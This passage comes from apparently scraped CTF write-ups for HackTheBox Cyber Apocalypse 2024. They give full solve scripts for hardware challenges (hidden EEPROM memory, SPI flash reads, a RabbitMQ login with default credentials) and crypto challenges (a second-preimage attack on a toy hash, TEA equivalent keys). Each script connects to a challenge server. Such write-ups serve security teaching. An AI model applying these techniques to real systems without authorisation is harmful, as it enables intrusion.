is high, the data stored at the memory location determined by the address pins is asserted on the outputs. The outputs are put in a high impedance state whenever CE or OE is high. This dual line control gives designers increased flexibility in preventing bus contention. So, to read data, we need to: Use set_ce_pin(0) to set the Chip Enable (CE) pin low, Use set_oe_pin(0) to set the Output Enable (OE) pin low, Use set_we_pin(5) to set the Write Enable (WE) pin high, And use set_address_pins(addr) to choose the reading address. For setting an address, for instance, if we aim to read from address 0x2, we need to set the A1 pin high (e.g., to 5V), and the rest low, to represent 0x2 in binary (00000000010). The EEPROM’s address space spans 11 bits (A10 - A0), ranging from 0x000 to 0x7ff. Below is the script that we create to read the data: from pwn import * r = remote('94.237.60.39', 55024) def set_address_pins(address): cmd = f'set_address_pins({str(address)})'.encode() # print(cmd) r.sendlineafter(b'\u003e ', cmd) def set_ce_pin(val): cmd = f'set_ce_pin({val})'.encode() # print(cmd) r.sendlineafter(b'\u003e ', cmd) def set_oe_pin(val): cmd = f'set_oe_pin({val})'.encode() # print(cmd) r.sendlineafter(b'\u003e ', cmd) def set_we_pin(val): cmd = f'set_we_pin({val})'.encode() # print(cmd) r.sendlineafter(b'\u003e ', cmd) def read_byte(): r.sendlineafter(b'\u003e ', b'read_byte()') return r.recvline().strip() def read_data(_addr): bits = bin(_addr)[2:].rjust(11, '0') addr = [int(ch)*5 for ch in bits] set_address_pins(addr) out = read_byte().strip(b'\u003e ') val = int(out.split(b' ')[1], 16) return val # Setup read mode set_ce_pin(0) set_oe_pin(0) set_we_pin(5) for i in range(0, 0x800): val = read_data(i) print(i, val) Initially, I attempted to sequentially read data from address 0x000 to 0x7ff. However, this method yielded no useful data, as all responses were 0. Upon a second review of the documentation, I uncovered a crucial detail suggesting the presence of additional EEPROM memory. DEVICE IDENTIFICATION: An extra 32 bytes of EEPROM memory are available to the user for device identification. By raising A9 to 12 ± 0.5V and using address locations 7E0H to 7FFH the additional bytes may be written to or read from in the same manner as the regular memory array. To access this, I adjusted the script to set the A9 pin to 12.5V. def read_secret_data(_addr): bits = bin(_addr)[2:].rjust(11, '0') addr = [int(ch)*5 for ch in bits] addr[1] = 12.5 # Set A9 to 12.5 to access extra 32 bytes data storage set_address_pins(addr) out = read_byte().strip(b'\u003e ') val = int(out.split(b' ')[1], 16) return val flag = [] for i in range(0x7e0, 0x800): val = read_secret_data(i) flag.append(val) print(f'{bytes(flag) = }') This adjustment was based on my hypothesis that the flag resided in this hidden memory section. My speculation proved accurate when the flag was successfully retrieved from this concealed storage area. Flag: HTB{AT28C16_EEPROM_s3c23t_1d!!!} ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-blockchain-hardware/:6:2","tags":["Writeup","Cyber Apocalypse","htb","blockchain","flash loan","hardware","spiflash","eeprom","wallet"],"title":"Cyber Apocalypse 2024: Blockchain \u0026 Hardware","uri":"/posts/cyber-apocalypse-2024-blockchain-hardware/"},{"categories":null,"content":"Rids [easy] Description Upon reaching the factory door, you physically open the RFID lock and find a flash memory chip inside. The chip’s package has the word W25Q128 written on it. Your task is to uncover the secret encryption keys stored within so the team can generate valid credentials to gain access to the facility. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-blockchain-hardware/:7:0","tags":["Writeup","Cyber Apocalypse","htb","blockchain","flash loan","hardware","spiflash","eeprom","wallet"],"title":"Cyber Apocalypse 2024: Blockchain \u0026 Hardware","uri":"/posts/cyber-apocalypse-2024-blockchain-hardware/"},{"categories":null,"content":"Initial Analysis In this challenge, we were provided with a file named client.py, a utility crafted by the author to facilitate interaction with the hardware in question. import socket import json def exchange(hex_list, value=0): # Configure according to your setup host = '94.237.50.175' # The server's hostname or IP address port = 38795 # The port used by the server cs=0 # /CS on A*BUS3 (range: A*BUS3 to A*BUS7) usb_device_url = 'ftdi://ftdi:2232h/1' # Convert hex list to strings and prepare the command data command_data = { \"tool\": \"pyftdi\", \"cs_pin\": cs, \"url\": usb_device_url, \"data_out\": [hex(x) for x in hex_list], # Convert hex numbers to hex strings \"readlen\": value } with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.connect((host, port)) # Serialize data to JSON and send s.sendall(json.dumps(command_data).encode('utf-8')) # Receive and process response data = b'' while True: data += s.recv(1024) if data.endswith(b']'): break response = json.loads(data.decode('utf-8')) #print(f\"Received: {response}\") return response # Example command jedec_id = exchange([0x9F], 3) print(bytes(jedec_id)) The objective appears to be reading data stored on the hardware, which is identified as a SPI flash memory model W25Q128. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-blockchain-hardware/:7:1","tags":["Writeup","Cyber Apocalypse","htb","blockchain","flash loan","hardware","spiflash","eeprom","wallet"],"title":"Cyber Apocalypse 2024: Blockchain \u0026 Hardware","uri":"/posts/cyber-apocalypse-2024-blockchain-hardware/"},{"categories":null,"content":"Solution After searching the documentation for this specific flash memory, I found a useful resource which elaborates on its functionality. Particularly, section 8.2.6 mentions a read command, denoted by the instruction code 0x03. This command allows us to specify a starting address in the form of a 24-bit address under the A23-A0 notation. Utilizing the provided client.py, we can easily configure an array of 4 bytes for this operation: the first byte for the instruction code and the subsequent three bytes for the 24-bit address, each represented in 8-bit segments. flag = exchange([0x03, 0x00, 0x00, 0x00], 256) print(bytes(flag)) This code snippet sends the read command to the hardware, starting from address 0x000000, and reads 256 bytes of data, which contains the flag. Flag: HTB{m3m02135_57023_53c2375_f02_3v32y0n3_70_533!@} ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-blockchain-hardware/:7:2","tags":["Writeup","Cyber Apocalypse","htb","blockchain","flash loan","hardware","spiflash","eeprom","wallet"],"title":"Cyber Apocalypse 2024: Blockchain \u0026 Hardware","uri":"/posts/cyber-apocalypse-2024-blockchain-hardware/"},{"categories":null,"content":"BunnyPass [very easy] Description As you discovered in the PDF, the production factory of the game is revealed. This factory manufactures all the hardware devices and custom silicon chips (of common components) that The Fray uses to create sensors, drones, and various other items for the games. Upon arriving at the factory, you scan the networks and come across a RabbitMQ instance. It appears that default credentials will work. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-blockchain-hardware/:8:0","tags":["Writeup","Cyber Apocalypse","htb","blockchain","flash loan","hardware","spiflash","eeprom","wallet"],"title":"Cyber Apocalypse 2024: Blockchain \u0026 Hardware","uri":"/posts/cyber-apocalypse-2024-blockchain-hardware/"},{"categories":null,"content":"Solution Reading through the challenge description, we know that the instance that we spawn is a RabbitMQ instance. Because it is stated that default credentials will work, we can login to the instance by using guest:guest pair. Then, we can check the available queues. One queue named factory_idle is quite interesting, so I decided to open it and check all of its messages (Click the queue, then click the Get messages). As we can see, the last message contains the flag. Flag: HTB{th3_hunt3d_b3c0m3s_th3_hunt3r} ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-blockchain-hardware/:8:1","tags":["Writeup","Cyber Apocalypse","htb","blockchain","flash loan","hardware","spiflash","eeprom","wallet"],"title":"Cyber Apocalypse 2024: Blockchain \u0026 Hardware","uri":"/posts/cyber-apocalypse-2024-blockchain-hardware/"},{"categories":null,"content":"Maze [very easy] Description In a world divided by factions, “AM,” a young hacker from the Phreaks, found himself falling in love with “echo,” a talented security researcher from the Revivalists. Despite the different backgrounds, you share a common goal: dismantling The Fray. You still remember the first interaction where you both independently hacked into The Fray’s systems and stumbled upon the same vulnerability in a printer. Leaving behind your hacker handles, “AM” and “echo,” you connected through IRC channels and began plotting your rebellion together. Now, it’s finally time to analyze the printer’s filesystem. What can you find? ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-blockchain-hardware/:9:0","tags":["Writeup","Cyber Apocalypse","htb","blockchain","flash loan","hardware","spiflash","eeprom","wallet"],"title":"Cyber Apocalypse 2024: Blockchain \u0026 Hardware","uri":"/posts/cyber-apocalypse-2024-blockchain-hardware/"},{"categories":null,"content":"Solution We received a zip file, and upon extracting its contents, we discovered a PDF. Inside this PDF, we found the flag. Flag: HTB{1n7323571n9_57uff_1n51d3_4_p21n732} Social Media Follow me on twitter ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-blockchain-hardware/:9:1","tags":["Writeup","Cyber Apocalypse","htb","blockchain","flash loan","hardware","spiflash","eeprom","wallet"],"title":"Cyber Apocalypse 2024: Blockchain \u0026 Hardware","uri":"/posts/cyber-apocalypse-2024-blockchain-hardware/"},{"categories":null,"content":" HackTheBox - Cyber Apocalypse 2024: Hacker Royale I have been casually participating in the Cyber Apocalypse CTF 2024. During this time, I managed to solve all the challenges in the pwn, crypto, blockchain, and hardware categories. In this write-up, I will share my solutions for all the challenges in the crypto category that I solved. If you are interested in reading the write-up for all the blockchain \u0026 hardware challenges, check out this post. If you are interested in reading the write-up for all the pwn challenges, check out this post. I managed to solve all of the pwn, crypto, blockchain, and hardware challenges by myself :) Crypto ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:0:0","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"ROT128 [insane] Description In the eerie stillness of the Bitting village, a dilapidated laboratory lies forgotten and forsaken, its ancient walls whispering secrets of unspeakable horrors. As you awaken within its confines, a shiver runs down your spine, the air thick with the weight of untold darkness. With no recollection of how you came to be here, you begin to explore the place. The dim glow of flickering lights casts long shadows across the worn floors, revealing rusted equipment and decaying machinery. The air is heavy with the scent of decay and abandonment, a tangible reminder of the atrocities that once transpired within these walls. Soon, you uncover the sinister truth lurking within the laboratory’s forgotten depths. This place was a chamber of horrors, a breeding ground for abominable experiments in human cloning. The realization sends chills coursing through your veins, your mind reeling at the thought of the atrocities committed in the name of science. But there is no time to dwell on the horrors of the past, because a sinister countdown echoes through the laboratory, its ominous tones a harbinger of impending doom. Racing against the ticking clock, you discover the source of the impending catastrophe—a chemical reactor primed to unleash devastation upon the village. With the weight of the world upon your shoulders, you realize that you alone possess the knowledge to defuse the deadly device. As a chemist, you understand the delicate balance of chemical reactions, and you know that triggering a specific collision multiple times is the key to averting disaster. With steady hands and a racing heart, you get to work. As the seconds tick away, you feel the weight of the world bearing down upon you, but you refuse to falter. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:1:0","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Initial Analysis In this challenge, we were given a source code named server.py. import random, os, signal from Crypto.Util.number import long_to_bytes as l2b, bytes_to_long as b2l from secret import FLAG ROUNDS = 3 USED_STATES = [] _ROL_ = lambda x, i : ((x \u003c\u003c i) | (x \u003e\u003e (N-i))) \u0026 (2**N - 1) N = 128 def handler(signum, frame): print(\"\\n\\nToo slow, don't try to do sneaky things.\") exit() def validate_state(state): if not all(0 \u003c s \u003c 2**N-1 for s in user_state[-2:]) or not all(0 \u003c= s \u003c N for s in user_state[:4]): print('Please, make sure your input satisfies the upper and lower bounds.') return False if sorted(state[:4]) in USED_STATES: print('You cannot reuse the same state') return False if sum(user_state[:4]) \u003c 2: print('We have to deal with some edge cases...') return False return True class HashRoll: def __init__(self): self.reset_state() def hash_step(self, i): r1, r2 = self.state[2*i], self.state[2*i+1] return _ROL_(self.state[-2], r1) ^ _ROL_(self.state[-1], r2) def update_state(self, state=None): if not state: self.state = [0] * 6 self.state[:4] = [random.randint(0, N) for _ in range(4)] self.state[-2:] = [random.randint(0, 2**N) for _ in range(2)] else: self.state = state def reset_state(self): self.update_state() def digest(self, buffer): buffer = int.from_bytes(buffer, byteorder='big') m1 = buffer \u003e\u003e N m2 = buffer \u0026 (2**N - 1) self.h = b'' for i in range(2): self.h += int.to_bytes(self.hash_step(i) ^ (m1 if not i else m2), length=N//8, byteorder='big') return self.h print('Can you test my hash function for second preimage resistance? You get to select the state and I get to choose the message ... Good luck!') hashfunc = HashRoll() for _ in range(ROUNDS): print(f'ROUND {_+1}/{ROUNDS}!') server_msg = os.urandom(32) hashfunc.reset_state() server_hash = hashfunc.digest(server_msg) print(f'You know H({server_msg.hex()}) = {server_hash.hex()}') signal.signal(signal.SIGALRM, handler) signal.alarm(2) user_state = input('Send your hash function state (format: a,b,c,d,e,f) :: ').split(',') try: user_state = list(map(int, user_state)) if not validate_state(user_state): print(\"The state is not valid! Try again.\") exit() hashfunc.update_state(user_state) if hashfunc.digest(server_msg) == server_hash: print(f'Moving on to the next round!') USED_STATES.append(sorted(user_state[:4])) else: print('Not today.') exit() except: print(\"The hash function's state must be all integers.\") exit() finally: signal.alarm(0) print(f'Uhm... how did you do that? I thought I had cryptanalyzed it enough ... {FLAG}') The code is extensive, but essentially, the task is to create a unique hashing algorithm referred to as HashRoll. Upon checking through the HashRoll’s design, we can see that it operates with six internal states. These states are manipulated through the update_state function. The hashing process involves the digest function, which computes the hash for the given message. To illustrate, if we consider a 32-byte message in the buffer, the digest function begins by dividing this message into two 16-byte segments, denoted as $m_{0}$ and $m_{1}$. The computation of the hash result follows this segmentation. $$ \\text{digest}(m) = m_{0} \\oplus h_{0} || m_{1} \\oplus h_{1} $$ Let’s see how the $h$ is made. $$ h_{0} = \\text{ROL}(s_{4}, s_{0}) \\oplus \\text{ROL}(s_{5}, s_{1})\\\\ h_{1} = \\text{ROL}(s_{4}, s_{2}) \\oplus \\text{ROL}(s_{5}, s_{3}) $$ where $s$ stands for states. Next, let’s find out the goal of this challenge. Looking at the for loop, the main task is to come up with new, unique states. With the same $\\text{m}$ and $\\text{digest}$, our input states should give us back the same $\\text{digest}$. Knowing what we need to do, let’s start thinking about how to tackle this challenge. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:1:1","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Solution First, I tackled this challenge by trying to express its logic through mathematical equations. The task is to find different states that would lead to the same hash_step result for both $h_{0}$ and $h_{1}$. To figure out the values of $h_{0}$ and $h_{1}$ our states input needs to generate, observe that given $m$ and its hash $\\text{digest}(m)$ (let’s call $\\text{digest}(m)$ as $d$), we can easily find the $h$ values. By dividing both $m$ (into $m_0$ and $m_1$) and $d$ (into $d_0$ and $d_1$), we notice: $$ h_{0} = m_{0} \\oplus d_{0}\\\\ h_1 = m_1 \\oplus d_1 $$ Next, while attempting to mathematically represent the hash_step operation, I noticed that the xor operation can be represented as addition in $GF(2)$, and the ROL operation can be represented as multiplication by a special matrix in $GF(2)$ that can rotate a vector or another matrix. For instance, if we want to calculate _ROL_(2, 2) in an 8-bit space, it is equivalent to the following equation: $$ \\text{ROL}(2,2) = \\begin{pmatrix} 0\u00260\u00261\u00260\u00260\u00260\u00260\u00260\\\\ 0\u00260\u00260\u00261\u00260\u00260\u00260\u00260\\\\ 0\u00260\u00260\u00260\u00261\u00260\u00260\u00260\\\\ 0\u00260\u00260\u00260\u00260\u00261\u00260\u00260\\\\ 0\u00260\u00260\u00260\u00260\u00260\u00261\u00260\\\\ 0\u00260\u00260\u00260\u00260\u00260\u00260\u00261\\\\ 1\u00260\u00260\u00260\u00260\u00260\u00260\u00260\\\\ 0\u00261\u00260\u00260\u00260\u00260\u00260\u00260\\\\ \\end{pmatrix} * \\begin{pmatrix} 0 \\\\ 0 \\\\ 0 \\\\ 0 \\\\ 0 \\\\ 0 \\\\ 1 \\\\ 0 \\\\ \\end{pmatrix} $$ Next, calculating $2 \\oplus 2$ is essentially addition in $GF(2)$. $$ 2 \\oplus 2 = \\begin{pmatrix}0\u00260\u00260\u00260\u00260\u00260\u00261\u00260\\end{pmatrix} + \\begin{pmatrix}0\u00260\u00260\u00260\u00260\u00260\u00261\u00260\\end{pmatrix} $$ So, by analyzing how the hash_step is generated, we can deduce it is equivalent to an equation involving $\\text{ROL}_{i}$, the matrix I described earlier. $$ r_0 = \\text{ROL}_{s_0}\\\\ r_1 = \\text{ROL}_{s_1}\\\\ r_2 = \\text{ROL}_{s_2}\\\\ r_3 = \\text{ROL}_{s_3}\\\\ $$ $$ h_0 = r_0s_4+r_1s_5\\\\ h_1 = r_2s_4+r_3s_5\\\\ $$ With these equations in hand, we find ourselves with only $h_0$ and $h_1$ known, leaving us with two equations and six unknowns. To tackle this, I decided to define four of the unknowns myself: $r_0$, $r_1$, $r_2$, and $r_3$. I set the value of $r_0$ equal to $r_2$ to help eliminate variables in our equations. Assuming we set: Both $r_0$ and $r_2$ to $\\text{ROL}_a = r_a$ $r_1$ to $\\text{ROL}_b = r_b$ $r_3$ to $\\text{ROL}_d = r_d$ This leads us to the following equation: $$ \\begin{align} h_0 = r_as_4 + r_bs_5 \\\\ h_1 = r_as_4 + r_ds_5 \\\\ \\end{align} $$ If we subtract the equations we have, we will arrive at a new equation as follows: $$ \\begin{align} (h_0 - h_1) = (r_b-r_d)s_5 \\\\ \\end{align} $$ Knowing $h_0$ and $h_1$, and having defined $r_b$ and $r_d$ ourselves, we can easily solve this equation to find $s_5$ with the help of SageMath’s solve_right() function. After determining $s_5$, and since we’ve also chosen $r_a$ ourselves, figuring out $s_4$ becomes straightforward. $$ \\begin{align} h_0 = r_as_4 + r_bs_5 \\\\ h_0 - r_bs_5 = r_as_4 \\\\ \\end{align} $$ To solve this equation, we can use SageMath’s solve_right() again. Now, we just need to implement this. We have three rounds, and I’ve predefined the values as follows: ROUND_1: $a=c=1$, $b=2$, $d=3$ ROUND_2: $a=c=2$, $b=3$, $d=4$ ROUND_3: $a=c=3$, $b=4$, $d=5$ Below is the full script: from pwn import * ROUNDS = 3 N = 128 r = remote('83.136.249.138', int(36059)) print(r.recvline().strip()) # Convert integer to vector of 128-bits def i2v(A, N=128): binary_str = bin(A)[2:] bits = [0 for _ in range(N)] for i in range(len(binary_str)): bits[-(i+1)] = int(binary_str[-(i+1)]) return vector(GF(2), bits) # Convert vector of 128-bits to integer def v2i(v): result = 0 for i in range(len(v)): result += (int(v[-(i+1)])) * (2^i) return result # Generate ROL matrix for 128-bits space def gen_rol_mat(rol, N=128): m = [] for i in range(N): temp = [0 for _ in range(N)] temp[(i+rol) % N] = 1 m.append(temp) return Matrix(GF(2), m) for ROUND in range(ROUNDS): print(r.recvline().strip()) out = r.recvline().strip() print(out) _server_msg, _server_hash = out.strip(b'You know H(').split(b') = ') print(_server_msg) print(_server_hash) server_msg = bytes.fromhex(_server_msg.decode()) server_hash = bytes.from","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:1:2","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Tsayaki [hard] Description You find yourself in the middle of a deadly ancient maze. The maze sprawls before you, its secrets veiled in shadows, its gates locked tight against intruders. With thousands of keys shimmering under the harsh light, you steel yourself for the daunting challenge ahead. Each chamber of the maze presents a new puzzle to unravel, each gate a barrier to overcome. Armed with determination and resolve, you set forth into the labyrinth’s depths, knowing that your survival hinges on unlocking the path forward by finding the proper key. With each new chamber you enter, you are greeted with a cup of tea—a brief respite from the perilous journey that lies ahead. But the tea is not the only gift bestowed upon you in these chambers. With each cup, you receive a hint that will guide you on how to move on. NOTE: ’tea.py’ can be found in the challenge ‘Iced Tea’ ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:2:0","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Initial Analysis In this challenge, we were provided with a file named server.py. from tea import Cipher as TEA from secret import IV, FLAG import os ROUNDS = 10 def show_menu(): print(\"\"\" ============================================================================================ || I made this decryption oracle in which I let users choose their own decryption keys. || || I think that it's secure as the tea cipher doesn't produce collisions (?) ... Right? || || If you manage to prove me wrong 10 times, you get a special gift. || ============================================================================================ \"\"\") def run(): show_menu() server_message = os.urandom(20) print(f'Here is my special message: {server_message.hex()}') used_keys = [] ciphertexts = [] for i in range(ROUNDS): print(f'Round {i+1}/10') try: ct = bytes.fromhex(input('Enter your target ciphertext (in hex) : ')) assert ct not in ciphertexts for j in range(4): key = bytes.fromhex(input(f'[{i+1}/{j+1}] Enter your encryption key (in hex) : ')) assert len(key) == 16 and key not in used_keys used_keys.append(key) cipher = TEA(key, IV) enc = cipher.encrypt(server_message) if enc != ct: print(f'Hmm ... close enough, but {enc.hex()} does not look like {ct.hex()} at all! Bye...') exit() except: print('Nope.') exit() ciphertexts.append(ct) print(f'Wait, really? {FLAG}') if __name__ == '__main__': run() Looking at this challenge, the summary is that, given 10 ROUNDS, in each round, we need to provide 4 different keys. These keys, when used as the key for the Tiny Encryption Algorithm (TEA) with the same input, should generate the same encryption result. Below is the implementation of the TEA (sourced from another challenge named Iced TEA). I’ve added the decrypt_block method to the code below. import os from Crypto.Util.Padding import pad from Crypto.Util.number import bytes_to_long as b2l, long_to_bytes as l2b from enum import Enum class Mode(Enum): ECB = 0x01 CBC = 0x02 class Cipher: def __init__(self, key, iv=None): self.BLOCK_SIZE = 64 self.KEY = [b2l(key[i:i+self.BLOCK_SIZE//16]) for i in range(0, len(key), self.BLOCK_SIZE//16)] self.DELTA = 0x9e3779b9 self.IV = iv if self.IV: self.mode = Mode.CBC else: self.mode = Mode.ECB def _xor(self, a, b): return b''.join(bytes([_a ^ _b]) for _a, _b in zip(a, b)) def encrypt(self, msg): msg = pad(msg, self.BLOCK_SIZE//8) blocks = [msg[i:i+self.BLOCK_SIZE//8] for i in range(0, len(msg), self.BLOCK_SIZE//8)] ct = b'' if self.mode == Mode.ECB: for pt in blocks: ct += self.encrypt_block(pt) elif self.mode == Mode.CBC: X = self.IV for pt in blocks: enc_block = self.encrypt_block(self._xor(X, pt)) ct += enc_block X = enc_block return ct def encrypt_block(self, msg): m0 = b2l(msg[:4]) m1 = b2l(msg[4:]) K = self.KEY msk = (1 \u003c\u003c (self.BLOCK_SIZE//2)) - 1 s = 0 for i in range(32): s += self.DELTA m0 += ((m1 \u003c\u003c 4) + K[0]) ^ (m1 + s) ^ ((m1 \u003e\u003e 5) + K[1]) m0 \u0026= msk m1 += ((m0 \u003c\u003c 4) + K[2]) ^ (m0 + s) ^ ((m0 \u003e\u003e 5) + K[3]) m1 \u0026= msk m = ((m0 \u003c\u003c (self.BLOCK_SIZE//2)) + m1) \u0026 ((1 \u003c\u003c self.BLOCK_SIZE) - 1) # m = m0 || m1 return l2b(m) def decrypt_block(self, msg): m = b2l(msg) m1 = m \u0026 ((1 \u003c\u003c (self.BLOCK_SIZE//2)) - 1) m0 = m \u003e\u003e (self.BLOCK_SIZE//2) K = self.KEY msk = (1 \u003c\u003c (self.BLOCK_SIZE//2)) - 1 s = self.DELTA * 32 for i in range(32): m1 -= ((m0 \u003c\u003c 4) + K[2]) ^ (m0 + s) ^ ((m0 \u003e\u003e 5) + K[3]) m1 \u0026= msk m0 -= ((m1 \u003c\u003c 4) + K[0]) ^ (m1 + s) ^ ((m1 \u003e\u003e 5) + K[1]) m0 \u0026= msk s -= self.DELTA decrypted_block = l2b(m0) + l2b(m1) return decrypted_block Now that we understand the main goal of the challenge, let’s consider how to approach it. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:2:1","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Solution First, note that in server.py, a static IV is used. Recovering the IV is straightforward, because when the server provides the message and the encryption result, we also know the key since it’s provided by us. To recover the IV, we can simply connect to the server, then decrypt the given encryption result with our input key, and finally xor it with the message. After recovering the IV, the next step is to figure out how we can find 4 different keys that produce the same encryption result for the same input. Upon searching about the TEA cipher on Google, we found a paper which explains that the key of the TEA cipher can be defined as: $$ K = K_0 || K_1 || K_2 || K_3 $$ If we flip the most significant bits (MSBs) of both $K_0$ and $K_1$, or both $K_2$ and $K_3$, we end up with a different key that produces the same encryption result. This indicates that we can start by generating a random key and then create 4 pairs of keys as follows: The original key. A key with the MSBs of both $K_0$ and $K_1$ flipped. A key with the MSBs of both $K_2$ and $K_3$ flipped. A key where the MSBs of all $K_i$ are flipped. Below is the full script used to implement the above strategy: from Crypto.Util.Padding import pad from Crypto.Util.number import bytes_to_long as b2l, long_to_bytes as l2b from enum import Enum class Mode(Enum): ECB = 0x01 CBC = 0x02 class TEA: def __init__(self, key, iv=None): self.BLOCK_SIZE = 64 self.KEY = [b2l(key[i:i+self.BLOCK_SIZE//16]) for i in range(0, len(key), self.BLOCK_SIZE//16)] self.DELTA = 0x9e3779b9 self.IV = iv if self.IV: self.mode = Mode.CBC else: self.mode = Mode.ECB def _xor(self, a, b): return b''.join(bytes([_a ^ _b]) for _a, _b in zip(a, b)) def encrypt(self, msg): msg = pad(msg, self.BLOCK_SIZE//8) blocks = [msg[i:i+self.BLOCK_SIZE//8] for i in range(0, len(msg), self.BLOCK_SIZE//8)] ct = b'' if self.mode == Mode.ECB: for pt in blocks: ct += self.encrypt_block(pt) elif self.mode == Mode.CBC: X = self.IV for pt in blocks: enc_block = self.encrypt_block(self._xor(X, pt)) ct += enc_block X = enc_block return ct def encrypt_block(self, msg): m0 = b2l(msg[:4]) m1 = b2l(msg[4:]) K = self.KEY msk = (1 \u003c\u003c (self.BLOCK_SIZE//2)) - 1 s = 0 for i in range(32): s += self.DELTA m0 += ((m1 \u003c\u003c 4) + K[0]) ^ (m1 + s) ^ ((m1 \u003e\u003e 5) + K[1]) m0 \u0026= msk m1 += ((m0 \u003c\u003c 4) + K[2]) ^ (m0 + s) ^ ((m0 \u003e\u003e 5) + K[3]) m1 \u0026= msk m = ((m0 \u003c\u003c (self.BLOCK_SIZE//2)) + m1) \u0026 ((1 \u003c\u003c self.BLOCK_SIZE) - 1) # m = m0 || m1 return l2b(m) def decrypt_block(self, msg): m = b2l(msg) m1 = m \u0026 ((1 \u003c\u003c (self.BLOCK_SIZE//2)) - 1) m0 = m \u003e\u003e (self.BLOCK_SIZE//2) K = self.KEY msk = (1 \u003c\u003c (self.BLOCK_SIZE//2)) - 1 s = self.DELTA * 32 for i in range(32): m1 -= ((m0 \u003c\u003c 4) + K[2]) ^ (m0 + s) ^ ((m0 \u003e\u003e 5) + K[3]) m1 \u0026= msk m0 -= ((m1 \u003c\u003c 4) + K[0]) ^ (m1 + s) ^ ((m1 \u003e\u003e 5) + K[1]) m0 \u0026= msk s -= self.DELTA decrypted_block = l2b(m0) + l2b(m1) return decrypted_block from pwn import * def flip(x): return p32(u32(x) ^ 0x00000080) def gen_keys(): key = os.urandom(16) print(f'{key.hex() = }') keys = [] k0 = key[:4] k1 = key[4:8] k2 = key[8:12] k3 = key[12:] keys.append(k0+k1+k2+k3) keys.append(flip(k0)+flip(k1)+k2+k3) keys.append(k0+k1+flip(k2)+flip(k3)) keys.append(flip(k0)+flip(k1)+flip(k2)+flip(k3)) return keys # Recover IV r = remote('94.237.63.83', 46862) r.recvuntil(b': ') msg = bytes.fromhex(r.recvline().strip().decode()) print(f'{msg.hex() = }') keys = gen_keys() for key in keys[:1]: print('key', key.hex()) print('msg', msg.hex()) cipher = TEA(key, b'\\x00'*8) out = cipher.encrypt(msg) print(out.hex()) print('---') r.sendlineafter(b': ', out.hex().encode()) r.sendlineafter(b': ', key.hex().encode()) r.recvuntil(b'but ') ct = bytes.fromhex(r.recvuntil(b' ').strip(b' ').decode()) print(f'{ct.hex() = }') first_block = ct[:8] iv = xor(cipher.decrypt_block(first_block), msg[:8]) print(f'{iv = }') # assert cipher = TEA(key, iv) test_out = cipher.encrypt(msg) print(f'{test_out = }') print(f'{ct = }') r.close() # Attack r = remote('94.237.63.83', 46862) r.recvunt","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:2:2","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Permuted [hard] Description You drop to the ground as a voltaic mist of energy surrounds you; within it are the Aranaya, reflections of your emotions that break into the physical world from the spiritual realm. Love, hate, pain and more writhe and dance before your eyes in an endless storm. As one tears into your soul, a lightning bolt strikes your inner being and the emotion remoulds into another. Startled and wide-eyed, you recognise an undeniable truth: they are all reflections of one another, an ecosystem of your being that you could lose forever. Consciousness leaves you as the psychedelic show whirls on. To retain your self, you must brave the storm: a cyclone of patterns, an infinitude of permutations. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:3:0","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Initial Analysis In this challenge, we were given two files named source.py and output.txt. from Crypto.Cipher import AES from Crypto.Util.Padding import pad from Crypto.Util.number import long_to_bytes from hashlib import sha256 from random import shuffle from secret import a, b, FLAG class Permutation: def __init__(self, mapping): self.length = len(mapping) assert set(mapping) == set(range(self.length)) # ensure it contains all numbers from 0 to length-1, with no repetitions self.mapping = list(mapping) def __call__(self, *args, **kwargs): idx, *_ = args assert idx in range(self.length) return self.mapping[idx] def __mul__(self, other): ans = [] for i in range(self.length): ans.append(self(other(i))) return Permutation(ans) def __pow__(self, power, modulo=None): ans = Permutation.identity(self.length) ctr = self while power \u003e 0: if power % 2 == 1: ans *= ctr ctr *= ctr power //= 